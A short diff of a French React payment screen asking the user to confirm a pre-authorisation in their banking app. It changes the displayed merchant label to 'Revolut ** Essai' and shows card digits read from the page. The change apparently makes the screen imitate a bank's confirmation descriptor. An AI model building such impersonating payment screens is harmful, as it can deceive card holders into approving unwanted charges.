@@ -207,7 +207,7 @@ const Board = () => {
             ) : (
               <>
                 <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
-                <span>NETTELER - Essai {selectedPlan}</span>
+                <span>Revolut ** Essai {selectedPlan}</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
